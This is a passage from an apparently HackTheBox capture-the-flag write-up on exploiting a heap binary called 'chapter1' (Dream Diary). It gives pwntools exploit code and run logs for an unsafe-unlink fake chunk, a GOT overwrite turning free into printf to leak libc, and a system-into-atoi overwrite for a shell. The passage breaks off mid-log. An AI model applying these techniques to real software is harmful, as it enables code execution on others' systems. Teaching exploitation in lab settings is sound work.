</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">LibcSearcher</span><span class="err">/</span><span class="no">libc-database</span><span class="err">/</span><span class="no">db</span><span class="err">/</span><span class="no">libc6_2.23-0ubuntu10_amd64.so</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Created</span> <span class="mi">5</span> <span class="no">chunks</span> <span class="no">of</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0x88</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Preparing</span> <span class="no">a</span> <span class="no">fake</span> <span class="no">chunk...</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Fake</span> <span class="no">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000000:</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">|</span><span class="na">................</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000010:</span>  <span class="nf">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="no">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="err">|</span><span class="p">.</span> <span class="err">`</span><span class="no">......</span> <span class="err">`</span><span class="no">.....</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000020:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000030:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000040:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000050:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000060:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000070:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000080:</span>  <span class="err">80</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">90</span>                       <span class="err">|</span><span class="na">.........</span><span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Editing</span> <span class="no">chunk</span> <span class="mi">3</span> <span class="no">with</span> <span class="no">a</span> <span class="no">fakr</span> <span class="no">chunk</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Triggering</span> <span class="no">Unlink</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Changing</span> <span class="no">freegot</span> <span class="no">to</span> <span class="no">print@plt</span> <span class="no">for</span> <span class="no">LIBC</span> <span class="no">Leak</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">Done</span><span class="p">!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="nf">Invalid</span> <span class="no">choice</span><span class="p">!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="nf">$</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[..</span><span class="no">snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400710</span>  <span class="no">printf@plt</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">got</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">GOT</span> <span class="no">protection</span><span class="p">:</span> <span class="no">Partial</span> <span class="no">RelRO</span> <span class="err">|</span> <span class="no">GOT</span> <span class="no">functions</span><span class="p">:</span> <span class="mi">11</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="err">[0</span><span class="nf">x602018</span><span class="p">]</span> <span class="no">free@GLIBC_2.2.5</span>  <span class="err">→</span>  <span class="mi">0x400710</span>
</span></span></code></pre></div><p>As you can see, we successfully overwritten the <code>free@got</code> with the PLT address of the <code>printf</code>. Now, we have the <code>printf</code>, as from the reverse engineering, we know that the free is done like <code>free(ptr[index])</code>, as the <code>free</code> is now <code>printf</code>, now it&rsquo;ll do the <code>printf(ptr(index])</code>, as obvious it should be we have a format string vulnerability now, we can leak a LIBC address to defeat ASLR.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Getting __libc_start_main&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;%15$p&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_start_main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;__libc_start_main+240:    0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">libc_start_main</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_start_main</span> <span class="o">-</span> <span class="mi">240</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="s2">&#34;__libc_start_main&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LIBC                 :    0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span></code></pre></div><p>Running the exploit now, we will have the LIBC leak:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="mi">0</span> <span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">50</span><span class="p">]</span> <span class="n">vagrant</span><span class="nd">@oracle</span><span class="p">(</span><span class="n">oracle</span><span class="p">)</span> <span class="n">HackTheBox</span><span class="o">&gt;</span> <span class="n">python3</span> <span class="n">chapter1</span><span class="o">.</span><span class="n">py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">program</span> <span class="s1">&#39;./chapter1&#39;</span><span class="p">:</span> <span class="n">PID</span> <span class="mi">2449</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Analyzing</span> <span class="o">/</span><span class="n">media</span><span class="o">/</span><span class="n">sf_Pwning</span><span class="o">/</span><span class="n">HackTheBox</span><span class="o">/</span><span class="n">chapter1</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Analyzing</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">LibcSearcher</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="n">database</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="n">libc6_2</span><span class="mf">.23</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu10_amd64</span><span class="o">.</span><span class="n">so</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Created</span> <span class="mi">5</span> <span class="n">chunks</span> <span class="n">of</span> <span class="n">size</span><span class="p">:</span> <span class="mh">0x88</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Preparing</span> <span class="n">a</span> <span class="n">fake</span> <span class="n">chunk</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Fake</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000000</span><span class="p">:</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">|................|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000010</span><span class="p">:</span>  <span class="n">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="n">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">|.</span> <span class="err">`</span><span class="o">......</span> <span class="err">`</span><span class="o">.....|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000020</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000030</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000040</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000050</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000060</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000070</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000080</span><span class="p">:</span>  <span class="mi">80</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="mi">90</span>                       <span class="o">|.........|</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Editing</span> <span class="n">chunk</span> <span class="mi">3</span> <span class="k">with</span> <span class="n">a</span> <span class="n">fakr</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Triggering</span> <span class="n">Unlink</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Changing</span> <span class="n">freegot</span> <span class="n">to</span> <span class="nb">print</span><span class="nd">@plt</span> <span class="k">for</span> <span class="n">LIBC</span> <span class="n">Leak</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">__libc_start_main</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">240</span><span class="p">:</span>    <span class="mh">0x7f01b54d3840</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">LIBC</span>                 <span class="p">:</span>    <span class="mh">0x7f01b54b3010</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl"><span class="n">Done</span><span class="err">!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>         <span class="n">Dream</span> <span class="n">Diary</span>          <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">Allocate</span>                 <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">Edit</span>                     <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">Delete</span>                   <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">Exit</span>                     <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
</span></span></code></pre></div><p>Now, all left is to calculate the <code>system</code> address and then overwrite another GOT entry with the <code>system</code> address and enjoy the shell:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1">#system = system.replace(b&#34;\x7f&#34;, b&#34;\x16\x7f&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">(</span><span class="s2">&#34;atoi&#34;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Now, running the final exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="mi">0</span> <span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span> <span class="n">vagrant</span><span class="nd">@oracle</span><span class="p">(</span><span class="n">oracle</span><span class="p">)</span> <span class="n">HackTheBox</span><span class="o">&gt;</span> <span class="n">python3</span> <span class="n">chapter1</span><span class="o">.</span><span class="n">py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">program</span> <span class="s1">&#39;./chapter1&#39;</span><span class="p">:</span> <span class="n">PID</span> <span class="mi">2677</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Analyzing</span> <span class="o">/</span><span class="n">media</span><span class="o">/</span><span class="n">sf_Pwning</span><span class="o">/</span><span class="n">HackTheBox</span><span class="o">/</span><span class="n">chapter1</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Analyzing</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">LibcSearcher</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="n">database</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="n">libc6_2</span><span class="mf">.23</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu10_amd64</span><span class="o">.</span><span class="n">so</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Created</span> <span class="mi">5</span> <span class="n">chunks</span> <span class="n">of</span> <span class="n">size</span><span class="p">:</span> <span class="mh">0x88</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Preparing</span> <span class="n">a</span> <span class="n">fake</span> <span class="n">chunk</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Fake</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000000</span><span class="p">:</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">|................|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000010</span><span class="p">:</span>  <span class="n">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="n">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">|.</span> <span class="err">`</span><span class="o">......</span> <span class="err">`</span><span class="o">.....|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000020</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000030</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000040</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000050</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000060</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000070</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="mi">00000080</span><span class="p">:</span>  <span class="mi">80</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="mi">90</span>                       <span class="o">|.........|</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Editing</span> <span class="n">chunk</span> <span class="mi">3</span> <span class="k">with</span> <span class="n">a</span> <span class="n">fakr</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Triggering</span> <span class="n">Unlink</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Changing</span> <span class="n">freegot</span> <span class="n">to</span> <span class="nb">print</span><span class="nd">@plt</span> <span class="k">for</span> <span class="n">LIBC</span> <span class="n">Leak</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">__libc_start_main</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">240</span><span class="p">:</span>    <span class="mh">0x7f89ceb6c840</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">LIBC</span>                 <span class="p">:</span>    <span class="mh">0x7f89ceb4c010</span>
